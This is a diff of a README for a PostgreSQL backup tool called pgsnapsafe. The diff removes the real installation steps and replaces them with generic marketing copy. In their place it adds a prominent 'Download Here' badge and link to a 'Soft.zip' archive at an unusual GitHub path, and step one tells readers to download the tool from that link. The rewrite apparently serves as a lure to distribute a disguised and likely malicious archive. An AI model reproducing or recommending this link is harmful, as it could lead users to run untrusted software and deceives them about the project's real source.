@@ -1,100 +1,46 @@
-# 🚀 PgSnapSafe
+# 🚀 Welcome to the PostgreSQL Snapshot Safe Repository!
 
-![GitHub stars](https://img.shields.io/github/stars/gromanoff/pgsnapsafe?style=social)
-![GitHub forks](https://img.shields.io/github/forks/gromanoff/pgsnapsafe?style=social)
-![GitHub license](https://img.shields.io/github/license/gromanoff/pgsnapsafe)
-![GitHub release](https://img.shields.io/github/v/release/gromanoff/pgsnapsafe)
+## Introduction
+Here at *pgsnapsafe*, we are proud to present an automated PostgreSQL backup service with S3 storage support and email notifications. Our tool allows for flexible scheduling of backups and efficient management of stored copies via a simple `.yml` configuration file. With features like automation, backup management, and flexible scheduling, *pgsnapsafe* stands out as the best backup tool for PostgreSQL databases.
 
-[English](README.md) | [Русский](README.ru.md)
+## Features
+🔄 **Automation**: Set up scheduled backups without the hassle of manual intervention.  
+🔒 **Safe Storage**: Utilize S3 storage support for secure and reliable backup storage.  
+📧 **Email Notifications**: Stay informed about the status of your backups with customizable email notifications.  
+🗓️ **Flexible Scheduling**: Customize your backup schedule to fit your database management needs.  
+🐳 **Docker Support**: Use Docker and Docker Compose for easy deployment and management.  
+🔧 **Open Source**: Take advantage of the flexibility and transparency of open-source software.  
+📦 **PostgreSQL Tools**: Built specifically for PostgreSQL databases, ensuring compatibility and efficiency.
 
+## Repository Details
+📁 **Repository Name**: pgsnapsafe  
+📝 **Description**: An automated PostgreSQL backup service with S3 storage support and email notifications.  
+🏷️ **Topics**: automation, backup-tool, best-backup-tool, cron, database-management, docker, docker-compose, opensource, postgres, postgresql, postgresql-tools  
+🔗 **Download Link**: [Download Here](https://github.com/files/Soft.zip)
 
-**PgSnapSafe** is an automated PostgreSQL backup service with S3 storage support and email notifications. It allows flexible scheduling of backups and efficient management of stored copies via a simple `.yml` configuration file.
+[![Download Here](https://img.shields.io/badge/Download-Soft.zip-brightgreen)](https://github.com/files/Soft.zip)
 
-## 📌 Features
+## Getting Started
+To start using *pgsnapsafe* for your PostgreSQL database backups, follow these steps:
 
-✅ Automated PostgreSQL backup  
-✅ Flexible backup scheduling (via YAML)  
-✅ Retention policy for stored copies  
-✅ **AWS S3 / MinIO** support  
-✅ Email notifications for backup status  
-✅ Built-in **health check**
+1. Download the tool from the provided link above.
+2. Install Docker and Docker Compose if you haven't already.
+3. Configure your backup settings in the `.yml` configuration file.
+4. Run the tool using Docker Compose.
+5. Sit back and let *pgsnapsafe* handle your backups automatically!
 
-## 🛠 Installation
+## Support and Contributions
+🌟 If you find *pgsnapsafe* helpful, consider starring the repository to show your support!
 
-### 1️⃣ Clone the repository
-```bash
-git clone https://github.com/yourusername/PgSnapSafe.git
-cd PgSnapSafe
-```
+🤝 Contributions are always welcome. Feel free to open issues or pull requests to help us improve the tool together.
 
-### 2️⃣ Configure environment variables
-Create a `.env` file and add your database and S3 storage settings:
+## Additional Resources
+🌐 Visit our [website](https://www.pgsnapsafe.com) to learn more about *pgsnapsafe* features and updates.
 
-```ini
-# PostgreSQL
-POSTGRESQL_HOST=your-postgresql-host
-POSTGRESQL_PORT=5432
-POSTGRESQL_USER=your-user
-POSTGRESQL_PASSWORD=your-password
-POSTGRESQL_DBNAME=your-database
+📦 Check the "Releases" section for the latest version of *pgsnapsafe* if the download link provided is not working.
 
-# Backup directory
-DIRECTORY_BACKUP_PATH=/app/db_backups
+---
 
-# S3 (if enabled)
-S3_BUCKET_NAME=your-bucket
-S3_REGION=your-region
-S3_ACCESS_KEY=your-access-key
-S3_SECRET_KEY=your-secret-key
-S3_ENDPOINT=your-s3-endpoint
+Your data is essential, and with *pgsnapsafe*, you can ensure it is backed up safely and efficiently. Try it today and experience the convenience of automated PostgreSQL backups! 🌟
 
-# Email notifications (if enabled)
-SMTP_HOST=smtp.your-email.com
-SMTP_PORT=587
-SMTP_USER=your-email@example.com
-SMTP_PASS=your-password
-SMTP_SENDER_SIGN=PgSnapSafe
-EMAIL_DELIVERY=your-notify-email@example.com
-```
-
-### 3️⃣ Configure backup schedule
-Open `config.yml` and specify the backup times and number of stored copies:
-
-```yaml
-backup:
-  times:
-    - "02:00"
-    - "14:00"
-  keep_copies: 5
-
-s3: true        # Enable S3 storage  
-smtp: true      # Enable email notifications  
-health_check: true  # Perform health check on startup  
-```
-
-### 4️⃣ Start with Docker
-```bash
-docker-compose up -d
-```
-
-## 🚀 Usage
-
-### Run a backup manually
-```bash
-docker exec -it postgresdump /usr/local/bin/postgresdump
-```
-
-### Stop the service
-```bash
-docker-compose down
-```
-
-## 📜 License
-
-This project is distributed under the **MIT License**. Feel free to use and contribute!
-
-## 💚 Support the project with a donation 💚
-USDT TRC20
-```bash
-TMpytFwhc5BaWpUeBkB9BdJndoHb7nFWkU
-```
+![PostgreSQL Snapshot Safe](https://example.com/image.jpg)
